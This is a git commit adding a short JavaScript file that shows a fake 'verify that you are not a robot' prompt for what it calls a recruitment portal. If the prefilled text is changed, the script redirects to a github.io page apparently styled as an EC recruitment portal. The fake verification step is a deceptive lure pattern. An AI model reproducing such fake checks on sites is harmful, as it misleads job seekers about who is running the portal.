8da1cbb0d980a924ef238656c3930c100649d48d
allregnws <promisebassey8081@gmail.com>
2025-05-31 12:45:20 +0100

    Create uge.js

---
+++ uge.js
@@ -0,0 +1,5 @@
+var password = 'EC JOB PORTAL'
+password=prompt('SMS :Welcome to our recruitment portal. Click OK to verify that you are not a robot ','EC JOB PORTAL');
+if (password != 'EC JOB PORTAL') {
+location.href='https://allregnws.github.io/EC.Recruitment.Portal.ug';
+}
